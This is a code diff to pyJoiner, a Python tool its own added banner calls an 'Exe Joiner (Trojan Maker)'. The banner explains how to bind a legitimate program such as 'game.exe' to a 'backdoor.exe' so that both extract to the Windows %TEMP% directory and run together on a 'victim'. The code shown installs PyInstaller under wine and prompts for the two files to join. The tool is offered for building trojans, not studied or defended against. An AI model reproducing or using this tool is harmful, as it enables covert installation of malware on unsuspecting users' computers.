@@ -1,20 +1,4 @@
-#!/usr/bin/python3.4
-#
-# pyJoiner - Open Source Exe Joiner (Kali Linux Version)
-# Coder: Daniel Henrique Negri Moreno (a.k.a W1ckerMan)
-#
-# pyJoiner is used for join files , like Self-extracting archive (SFX).
-#
-# The major difference resides in fact that pyJoiner extracts files
-# in %TEMP% Windows directory and executes them.
-#
-# After process, "/root/pyJoiner_output/py_file.exe" will be generated. 
-# The output "py_file.exe" file must be execute under Windows platform.
-# 
-# Usage: 
-# root@kali# python3.4 pyJoiner.py
-
-import os, sys, urllib.request
+import os, urllib.request
 
 def install_Python_PyInstaller():
     
@@ -41,6 +25,55 @@ def install_Python_PyInstaller():
         os.system('wine /root/.wine/drive_c/Python34/python.exe /root/.wine/drive_c/Python34/Scripts/pip.exe install pyinstaller')
         print('PyInstaller installation done!')
         print()
+
+def banner():
+    print('''\
+##########################################################################
+#                                                                        #
+#            pyJoiner - Open Source Exe Joiner (Trojan Maker)            #
+#                                                                        #
+#                                                                        #
+#                                                                        #
+# Coder: Daniel Henrique Negri Moreno (a.k.a W1ckerMan)                  #
+#                                                                        #
+#                                                                        #
+# What is pyJoiner?                                                      #
+#                                                                        #
+# pyJoiner is used for join files, like self-extracting archive (SFX).   #
+# The major difference resides in fact that pyJoiner extracts files      #
+# in %TEMP% Windows directory and executes them.                         #
+#                                                                        #
+#                                                                        #
+# Why use pyJoiner?                                                      #
+#                                                                        #
+# To create Torjan Horses.                                               #
+# Supose you have two files. First file, a legitm software,              #
+# e.g "game.exe".                                                        #
+# Second file, a malware, e.g "backdoor.exe".                            #
+# pyJoiner join first and second file in only one file: "py_file.exe".   #
+# "py_file.exe", when executed, extracts and execute, first ("game.exe") #
+# and second ("backdoor.exe") files at same time.                        #
+#                                                                        #
+#                                                                        # 
+# How to use pyJoiner?                                                   #
+#                                                                        #
+# e.g: "game.exe" is your first file. Plese type "game.exe" when         #
+# pyJoiner ask you "1st file: "                                          #
+# "backdoor.exe" is your second file. Please type "backdoor.exe" when    #
+# pyJoiner ask you "2nd file: "                                          #
+#                                                                        #
+#                                                                        #
+# After all, "/root/pyJoiner_output/py_file.exe" will be generated.      #
+#                                                                        #
+#                                                                        #
+#                              ATENTION                                  #
+#                                                                        #
+# "py_file.exe", when executed, extracts "output_file1*" and             #
+# "output_file2*" under Windows %TEMP% directory.                        #
+# Manual remove the files if you wanna reexecute "py_file.exe" in victim #
+#                                                                        #
+##########################################################################
+''')
 
 class FileExtensionError(Exception):
     def __str__(self):
@@ -108,6 +141,7 @@ join(file2, "output_file2", "%s") ''' %( str(file_n1.read()), str(file_n2.read()
 
 
 install_Python_PyInstaller()
+banner()
 
 file1 = file(input('1st file: '))
 file2 = file(input('2nd file: '))
